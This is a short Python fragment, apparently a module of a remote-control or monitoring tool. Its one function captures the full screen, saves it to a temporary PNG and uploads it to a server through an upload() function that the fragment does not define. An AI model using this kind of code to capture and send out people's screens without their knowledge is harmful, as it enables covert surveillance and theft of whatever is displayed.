import tempfile
from PIL import ImageGrab


def screenshot():
    """ Takes a screenshot and uploads it to the server"""
    screenshot = ImageGrab.grab()
    tmp_file = tempfile.NamedTemporaryFile()
    screenshot_file = tmp_file.name + ".png"
    tmp_file.close()
    screenshot.save(screenshot_file)
    upload(screenshot_file)
